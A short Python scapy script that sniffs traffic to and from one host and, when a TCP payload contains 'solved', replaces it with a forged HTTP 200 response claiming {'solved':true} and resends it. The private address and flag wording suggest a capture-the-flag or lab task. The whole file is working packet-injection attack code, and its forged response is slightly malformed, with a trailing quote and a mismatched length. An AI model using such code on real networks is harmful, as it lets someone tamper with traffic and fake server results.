from scapy.all import *

def modifyPkt(pkt):
    if TCP in pkt and pkt.haslayer(Raw):
        if b'"solved"' in pkt[Raw].load:
            # pkt.show()
            ether = pkt[Ether]
            ip = pkt[IP]
            tcp = pkt[TCP]
            
            data = pkt[Raw].load
            # print(data.decode())
            new_data = b'HTTP/1.1 200 OK\r\nServer: Werkzeug/3.1.3 Python/3.11.11\r\nDate: Mon, 17 Feb 2025 16:15:37 GMT\r\nContent-Type: application/json\r\nContent-Length: 17\r\nConnection: close\r\n\r\n{"solved":true}"'
            pkt[Raw].load = new_data
            send(pkt)
            pkt.show()

pkt = sniff(iface='eth0', filter='src or dst host 10.0.9.157', prn=modifyPkt)